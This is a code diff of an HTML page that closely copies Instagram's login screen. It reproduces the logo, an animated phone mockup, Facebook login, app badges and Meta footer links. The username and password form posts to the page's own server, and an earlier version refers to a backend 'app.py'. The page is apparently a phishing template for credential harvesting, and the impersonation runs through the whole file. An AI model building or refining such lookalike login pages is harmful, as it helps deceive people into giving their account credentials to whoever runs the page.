@@ -1,96 +1,636 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Instagram</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet"/>
   <style>
-    .instagram-gradient {
-      background: linear-gradient(135deg, #f56040, #c13584, #405de6);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      min-height: 100vh;
+      background: #fafafa;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      color: #262626;
+    }
+
+    .wrap {
+      display: flex;
+      align-items: center;
+      gap: 32px;
+      width: 100%;
+      max-width: 935px;
+      padding: 0 20px;
+      justify-content: center;
+    }
+
+    /* ── Phone slideshow ── */
+    .phone-wrap {
+      width: 380px;
+      flex-shrink: 0;
+      position: relative;
+      height: 581px;
+    }
+    @media (max-width: 768px) { .phone-wrap { display: none; } }
+
+    .phone-frame {
+      position: absolute;
+      top: 0; left: 50%;
+      transform: translateX(-50%);
+      width: 250px;
+      z-index: 2;
+      pointer-events: none;
+    }
+
+    .screenshots {
+      position: absolute;
+      top: 28px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 212px;
+      height: 460px;
+      overflow: hidden;
+      border-radius: 26px;
+      z-index: 1;
+    }
+
+    .slide {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0;
+      transition: opacity 0.8s ease-in-out;
+      background: #fafafa;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      padding: 12px;
+    }
+    .slide.active { opacity: 1; }
+
+    .slide-inner {
+      width: 100%;
+      height: 100%;
+      background: #fff;
+      border-radius: 4px;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Fake app UI inside phone */
+    .app-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 12px 8px;
+      border-bottom: 0.5px solid #dbdbdb;
+      background: #fff;
+    }
+    .app-header .insta-text {
+      font-family: 'Grand Hotel', cursive;
+      font-size: 20px;
+      color: #262626;
+    }
+    .app-header-icons { display: flex; gap: 14px; }
+    .app-header-icons span { font-size: 17px; }
+
+    .stories-row {
+      display: flex;
+      gap: 10px;
+      padding: 10px 10px 8px;
+      overflow: hidden;
+      border-bottom: 0.5px solid #dbdbdb;
+    }
+    .story-item { display: flex; flex-direction: column; align-items: center; gap: 4px; }
+    .story-ring {
+      width: 46px; height: 46px;
+      border-radius: 50%;
+      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+      display: flex; align-items: center; justify-content: center;
+    }
+    .story-ring.yours {
+      background: #dbdbdb;
+      position: relative;
+    }
+    .story-ring.yours::after {
+      content: '+';
+      position: absolute;
+      bottom: 0; right: 0;
+      background: #0095f6;
+      color: #fff;
+      width: 16px; height: 16px;
+      border-radius: 50%;
+      font-size: 11px;
+      font-weight: 700;
+      display: flex; align-items: center; justify-content: center;
+      border: 1.5px solid #fff;
+    }
+    .story-avatar {
+      width: 40px; height: 40px;
+      border-radius: 50%;
+      background: #e0e0e0;
+      border: 2px solid #fff;
+    }
+    .story-name { font-size: 9px; color: #262626; max-width: 50px; text-align: center; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
+
+    .post {
+      display: flex;
+      flex-direction: column;
+      border-bottom: 0.5px solid #dbdbdb;
+    }
+    .post-header {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 10px;
+    }
+    .post-avatar {
+      width: 30px; height: 30px;
+      border-radius: 50%;
+      background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+      padding: 2px;
+    }
+    .post-avatar-inner {
+      width: 100%; height: 100%;
+      border-radius: 50%;
+      background: #c7c7c7;
+      border: 1.5px solid #fff;
+    }
+    .post-username { font-size: 11px; font-weight: 600; color: #262626; flex: 1; }
+    .post-more { font-size: 16px; color: #262626; }
+    .post-image {
+      width: 100%;
+      aspect-ratio: 1;
+      object-fit: cover;
+    }
+    .post-image-placeholder {
+      width: 100%;
+      aspect-ratio: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+    }
+    .post-actions {
+      display: flex;
+      gap: 12px;
+      padding: 8px 10px 4px;
+    }
+    .post-actions span { font-size: 18px; }
+    .post-likes { font-size: 10px; font-weight: 600; padding: 0 10px 4px; color: #262626; }
+    .post-caption { font-size: 10px; padding: 0 10px 8px; color: #262626; }
+    .post-caption b { font-weight: 600; }
+
+    /* ── Right panel ── */
+    .right {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      width: 350px;
+      flex-shrink: 0;
+    }
+
+    .card {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 40px 40px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo {
+      font-family: 'Grand Hotel', cursive;
+      font-size: 56px;
+      color: #262626;
+      margin-bottom: 28px;
+      letter-spacing: -0.5px;
+      line-height: 1;
+    }
+
+    .form { width: 100%; display: flex; flex-direction: column; gap: 6px; }
+
+    .input-wrap { position: relative; width: 100%; }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      padding: 9px 8px 7px;
+      font-size: 12px;
+      color: #262626;
+      outline: none;
+      transition: border-color 0.15s;
+      height: 36px;
+    }
+    input[type="text"]:focus, input[type="password"]:focus { border-color: #a8a8a8; background: #fff; }
+    input::placeholder { color: #8e8e8e; font-size: 12px; }
+
+    .show-btn {
+      position: absolute;
+      right: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      font-size: 12px;
+      font-weight: 600;
+      color: #262626;
+      cursor: pointer;
+      padding: 0;
+    }
+
+    .btn-login {
+      width: 100%;
+      background: #0095f6;
+      color: #fff;
+      font-weight: 700;
+      font-size: 14px;
+      border: none;
+      border-radius: 8px;
+      padding: 0;
+      height: 32px;
+      cursor: pointer;
+      margin-top: 2px;
+      transition: background 0.15s;
+      letter-spacing: 0.2px;
+    }
+    .btn-login:hover { background: #1877f2; }
+    .btn-login:disabled { background: #b2dffc; cursor: default; opacity: 0.7; }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      gap: 18px;
+      width: 100%;
+      margin: 10px 0 4px;
+    }
+    .divider::before, .divider::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+    .divider span {
+      font-size: 13px;
+      font-weight: 600;
+      color: #8e8e8e;
+      letter-spacing: 1px;
+    }
+
+    .btn-facebook {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      background: none;
+      border: none;
+      color: #385185;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      padding: 6px 0;
+      transition: color 0.15s;
+    }
+    .btn-facebook:hover { color: #1a3d7c; }
+    .btn-facebook svg { width: 18px; height: 18px; flex-shrink: 0; }
+
+    .forgot {
+      font-size: 12px;
+      color: #00376b;
+      margin-top: 14px;
+      text-decoration: none;
+      align-self: center;
+    }
+    .forgot:hover { text-decoration: underline; }
+
+    .card-signup {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 20px;
+      text-align: center;
+      font-size: 14px;
+      color: #262626;
+    }
+    .card-signup a { color: #0095f6; font-weight: 600; text-decoration: none; }
+    .card-signup a:hover { text-decoration: underline; }
+
+    .get-app {
+      text-align: center;
+      font-size: 14px;
+      color: #262626;
+      margin-top: 12px;
+    }
+
+    .app-badges {
+      display: flex;
+      gap: 8px;
+      justify-content: center;
+      margin-top: 12px;
+    }
+    .badge {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 6px;
+      padding: 5px 12px;
+      text-decoration: none;
+      color: #262626;
+      transition: background 0.15s;
+    }
+    .badge:hover { background: #f5f5f5; }
+    .badge-icon { font-size: 20px; line-height: 1; }
+    .badge-text { display: flex; flex-direction: column; }
+    .badge-sub { font-size: 9px; color: #262626; line-height: 1.2; }
+    .badge-name { font-size: 13px; font-weight: 600; color: #262626; line-height: 1.2; }
+
+    /* ── Footer ── */
+    footer {
+      margin-top: 52px;
+      text-align: center;
+      font-size: 12px;
+      color: #8e8e8e;
+      max-width: 935px;
+      width: 100%;
+      padding: 0 20px 32px;
+    }
+    footer nav {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 4px 16px;
+      margin-bottom: 16px;
+    }
+    footer nav a { color: #8e8e8e; text-decoration: none; font-size: 12px; }
+    footer nav a:hover { text-decoration: underline; }
+    footer .lang-select {
+      background: none;
+      border: none;
+      color: #8e8e8e;
+      font-size: 12px;
+      cursor: pointer;
+      margin-bottom: 8px;
     }
   </style>
 </head>
-<body class="bg-black text-white min-h-screen flex items-center justify-center">
+<body>
 
-  <div class="w-full max-w-md mx-auto p-6">
-    <!-- Instagram Logo -->
-    <div class="flex justify-center mb-8">
-      <h1 class="text-5xl font-bold instagram-gradient">Instagram</h1>
+<div class="wrap">
+
+  <!-- Phone mockup with fake app UI -->
+  <div class="phone-wrap">
+    <!-- SVG phone frame -->
+    <svg class="phone-frame" viewBox="0 0 250 540" xmlns="http://www.w3.org/2000/svg">
+      <!-- outer shell -->
+      <rect x="2" y="2" width="246" height="536" rx="36" ry="36" fill="#fff" stroke="#dbdbdb" stroke-width="1.5"/>
+      <!-- inner bezel -->
+      <rect x="10" y="10" width="230" height="520" rx="30" ry="30" fill="none" stroke="#e8e8e8" stroke-width="1"/>
+      <!-- side buttons -->
+      <rect x="0" y="100" width="3" height="40" rx="1.5" fill="#dbdbdb"/>
+      <rect x="0" y="148" width="3" height="40" rx="1.5" fill="#dbdbdb"/>
+      <rect x="247" y="130" width="3" height="60" rx="1.5" fill="#dbdbdb"/>
+      <!-- notch / dynamic island -->
+      <rect x="85" y="16" width="80" height="18" rx="9" fill="#1a1a1a"/>
+      <!-- home indicator -->
+      <rect x="90" y="516" width="70" height="4" rx="2" fill="#c7c7c7"/>
+    </svg>
+
+    <!-- Scrolling screenshots inside phone -->
+    <div class="screenshots">
+      <!-- Slide 1: Feed -->
+      <div class="slide active" id="slide1">
+        <div class="slide-inner">
+          <div class="app-header">
+            <span class="insta-text">Instagram</span>
+            <div class="app-header-icons">
+              <span>♡</span>
+              <span>✈</span>
+            </div>
+          </div>
+          <div class="stories-row">
+            <div class="story-item">
+              <div class="story-ring yours"><div class="story-avatar"></div></div>
+              <div class="story-name">Your story</div>
+            </div>
+            <div class="story-item">
+              <div class="story-ring"><div class="story-avatar" style="background:#c8b8e8;"></div></div>
+              <div class="story-name">alex</div>
+            </div>
+            <div class="story-item">
+              <div class="story-ring"><div class="story-avatar" style="background:#b8d8e8;"></div></div>
+              <div class="story-name">maria</div>
+            </div>
+            <div class="story-item">
+              <div class="story-ring"><div class="story-avatar" style="background:#e8c8b8;"></div></div>
+              <div class="story-name">john</div>
+            </div>
+          </div>
+          <div class="post">
+            <div class="post-header">
+              <div class="post-avatar"><div class="post-avatar-inner" style="background:#a0c4ff;"></div></div>
+              <div class="post-username">natgeo</div>
+              <div class="post-more">···</div>
+            </div>
+            <div class="post-image-placeholder" style="background:linear-gradient(135deg,#667eea,#764ba2);">🏔️</div>
+            <div class="post-actions"><span>🤍</span><span>💬</span><span>↗</span></div>
+            <div class="post-likes">24,891 likes</div>
+            <div class="post-caption"><b>natgeo</b> The peak at golden hour.</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide 2: Explore -->
+      <div class="slide" id="slide2">
+        <div class="slide-inner">
+          <div class="app-header" style="justify-content:center;">
+            <span style="font-size:13px;font-weight:600;">Explore</span>
+          </div>
+          <div style="padding:8px;">
+            <div style="background:#fafafa;border:1px solid #dbdbdb;border-radius:8px;padding:7px 10px;font-size:11px;color:#8e8e8e;display:flex;align-items:center;gap:6px;">🔍 Search</div>
+          </div>
+          <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:2px;padding:0 2px;">
+            <div style="aspect-ratio:1;background:linear-gradient(135deg,#f093fb,#f5576c);border-radius:2px;"></div>
+            <div style="aspect-ratio:1;background:linear-gradient(135deg,#4facfe,#00f2fe);border-radius:2px;grid-row:span 2;"></div>
+            <div style="aspect-ratio:1;background:linear-gradient(135deg,#43e97b,#38f9d7);border-radius:2px;"></div>
+            <div style="aspect-ratio:1;background:linear-gradient(135deg,#fa709a,#fee140);border-radius:2px;"></div>
+            <div style="aspect-ratio:1;background:linear-gradient(135deg,#a18cd1,#fbc2eb);border-radius:2px;"></div>
+            <div style="aspect-ratio:1;background:linear-gradient(135deg,#fccb90,#d57eeb);border-radius:2px;grid-row:span 2;"></div>
+            <div style="aspect-ratio:1;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:2px;"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Slide 3: Profile -->
+      <div class="slide" id="slide3">
+        <div class="slide-inner">
+          <div class="app-header" style="justify-content:center;">
+            <span style="font-size:13px;font-weight:600;">username</span>
+          </div>
+          <div style="padding:14px 12px 8px;display:flex;gap:14px;align-items:center;">
+            <div style="width:70px;height:70px;border-radius:50%;background:linear-gradient(45deg,#f09433,#dc2743,#bc1888);display:flex;align-items:center;justify-content:center;flex-shrink:0;">
+              <div style="width:64px;height:64px;border-radius:50%;background:#c9b8f0;border:2px solid #fff;"></div>
+            </div>
+            <div style="display:flex;gap:16px;">
+              <div style="text-align:center;"><div style="font-size:14px;font-weight:600;">42</div><div style="font-size:11px;color:#8e8e8e;">posts</div></div>
+              <div style="text-align:center;"><div style="font-size:14px;font-weight:600;">1.2k</div><div style="font-size:11px;color:#8e8e8e;">followers</div></div>
+              <div style="text-align:center;"><div style="font-size:14px;font-weight:600;">310</div><div style="font-size:11px;color:#8e8e8e;">following</div></div>
+            </div>
+          </div>
+          <div style="padding:0 12px 10px;font-size:11px;font-weight:600;">Display Name</div>
+          <div style="display:flex;gap:4px;padding:0 12px 10px;">
+            <button style="flex:1;background:#efefef;border:none;border-radius:8px;padding:6px;font-size:11px;font-weight:600;cursor:pointer;">Edit profile</button>
+            <button style="flex:1;background:#efefef;border:none;border-radius:8px;padding:6px;font-size:11px;font-weight:600;cursor:pointer;">Share profile</button>
+          </div>
+          <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:2px;">
+            <div style="aspect-ratio:1;background:linear-gradient(135deg,#e0c3fc,#8ec5fc);"></div>
+            <div style="aspect-ratio:1;background:linear-gradient(135deg,#f6d365,#fda085);"></div>
+            <div style="aspect-ratio:1;background:linear-gradient(135deg,#96fbc4,#f9f586);"></div>
+            <div style="aspect-ratio:1;background:linear-gradient(135deg,#fddb92,#d1fdff);"></div>
+            <div style="aspect-ratio:1;background:linear-gradient(135deg,#a1c4fd,#c2e9fb);"></div>
+            <div style="aspect-ratio:1;background:linear-gradient(135deg,#fbc2eb,#a6c1ee);"></div>
+          </div>
+        </div>
+      </div>
     </div>
+  </div>
 
-    <!-- Login Form -->
-    <div class="bg-zinc-900 rounded-xl p-8 shadow-2xl border border-zinc-800">
-      <h2 class="text-center text-xl font-semibold mb-6">Log into Instagram</h2>
+  <!-- Login panel -->
+  <div class="right">
+    <div class="card">
+      <div class="logo">Instagram</div>
 
-      <form id="loginForm" method="POST" class="space-y-4">
-        <!-- Username -->
-        <div>
-          <input
-            type="text"
-            name="username"
-            id="username"
-            placeholder="Username, email or mobile number"
-            class="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-3 focus:outline-none focus:border-blue-500 transition"
-            required>
+      <form method="POST" class="form">
+        <div class="input-wrap">
+          <input type="text" name="username" id="username" placeholder="Phone number, username, or email" />
         </div>
-
-        <!-- Password -->
-        <div>
-          <input
-            type="password"
-            name="password"
-            id="password"
-            placeholder="Password"
-            class="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-3 focus:outline-none focus:border-blue-500 transition"
-            required>
+        <div class="input-wrap">
+          <input type="password" name="password" id="password" placeholder="Password" />
+          <button type="button" class="show-btn" onclick="togglePwd()">Show</button>
         </div>
-
-        <!-- Submit Button -->
-        <button
-          type="submit"
-          class="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg font-semibold transition text-lg">
-          Log in
-        </button>
+        <button class="btn-login" type="submit" id="loginBtn">Log in</button>
       </form>
 
-      <div class="text-center mt-4">
-        <a href="#" class="text-blue-400 hover:underline text-sm">Forgot password?</a>
-      </div>
+      <div class="divider"><span>OR</span></div>
 
-      <div class="relative my-6">
-        <div class="absolute inset-0 flex items-center">
-          <div class="w-full border-t border-zinc-700"></div>
-        </div>
-        <div class="relative flex justify-center text-sm">
-          <span class="bg-zinc-900 px-4 text-zinc-500">OR</span>
-        </div>
-      </div>
-
-      <button class="w-full border border-zinc-700 hover:bg-zinc-800 py-3 rounded-lg flex items-center justify-center gap-2 mb-3">
-        <span>🔵</span>
+      <button class="btn-facebook">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#385185">
+          <path d="M24 12.073C24 5.404 18.627 0 12 0S0 5.404 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.236 2.686.236v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.267h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/>
+        </svg>
         Log in with Facebook
       </button>
 
-      <p class="text-center text-sm text-zinc-400 mt-6">
-        Don't have an account?
-        <a href="#" class="text-blue-400 hover:underline">Sign up</a>
-      </p>
+      <a href="#" class="forgot">Forgot password?</a>
     </div>
 
-    <!-- Footer -->
-    <p class="text-center text-xs text-zinc-500 mt-8">
-      © 2026 Instagram from Meta
-    </p>
-  </div>
+    <div class="card-signup">
+      Don't have an account? <a href="#">Sign up</a>
+    </div>
 
-  <script>
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-      // You can remove this alert after connecting to your app.py
-      // e.preventDefault();   ← Uncomment this line if you want to test without submitting
-    });
-  </script>
+    <div class="get-app">Get the app.</div>
+
+    <div class="app-badges">
+      <a href="#" class="badge">
+        <div class="badge-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+        </div>
+        <div class="badge-text">
+          <span class="badge-sub">Download on the</span>
+          <span class="badge-name">App Store</span>
+        </div>
+      </a>
+      <a href="#" class="badge">
+        <div class="badge-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="#3ddc84"><path d="M3.18 23.76c.3.17.65.19.98.08l12.76-7.37-2.78-2.78-10.96 10.07zM.54 1.4C.2 1.7 0 2.16 0 2.73v18.54c0 .57.2 1.03.54 1.33l.07.07L10.44 12.9v-.22L.61 1.32.54 1.4zM20.46 10.31l-2.78-1.6-3.08 3.08 3.08 3.08 2.81-1.62c.8-.46.8-1.21-.03-1.94zM3.18.24L15.94 7.6l-2.78 2.78L2.2.16c.33-.12.68-.09.98.08z"/></svg>
+        </div>
+        <div class="badge-text">
+          <span class="badge-sub">GET IT ON</span>
+          <span class="badge-name">Google Play</span>
+        </div>
+      </a>
+    </div>
+  </div>
+</div>
+
+<!-- Footer -->
+<footer>
+  <nav>
+    <a href="#">Meta</a>
+    <a href="#">About</a>
+    <a href="#">Blog</a>
+    <a href="#">Jobs</a>
+    <a href="#">Help</a>
+    <a href="#">API</a>
+    <a href="#">Privacy</a>
+    <a href="#">Consumer Health Privacy</a>
+    <a href="#">Terms</a>
+    <a href="#">Locations</a>
+    <a href="#">Instagram Lite</a>
+    <a href="#">Threads</a>
+    <a href="#">Contact Uploading &amp; Non-Users</a>
+    <a href="#">Meta Verified</a>
+  </nav>
+  <div style="margin-bottom:8px;">
+    <select class="lang-select">
+      <option>English</option>
+      <option>हिन्दी</option>
+      <option>Español</option>
+      <option>Français</option>
+      <option>Deutsch</option>
+    </select>
+  </div>
+  <p>© 2025 Instagram from Meta</p>
+</footer>
+
+<script>
+  // Slideshow
+  const slides = document.querySelectorAll('.slide');
+  let current = 0;
+  setInterval(() => {
+    slides[current].classList.remove('active');
+    current = (current + 1) % slides.length;
+    slides[current].classList.add('active');
+  }, 3000);
+
+  // Show/hide password
+  function togglePwd() {
+    const inp = document.getElementById('password');
+    const btn = inp.nextElementSibling;
+    if (inp.type === 'password') {
+      inp.type = 'text';
+      btn.textContent = 'Hide';
+    } else {
+      inp.type = 'password';
+      btn.textContent = 'Show';
+    }
+  }
+
+  // Disable login button when fields empty
+  const uname = document.getElementById('username');
+  const pwd = document.getElementById('password');
+  const btn = document.getElementById('loginBtn');
+
+  function checkFields() {
+    btn.disabled = !(uname.value.trim() && pwd.value.trim());
+  }
+  uname.addEventListener('input', checkFields);
+  pwd.addEventListener('input', checkFields);
+  checkFields();
+</script>
 </body>
 </html>
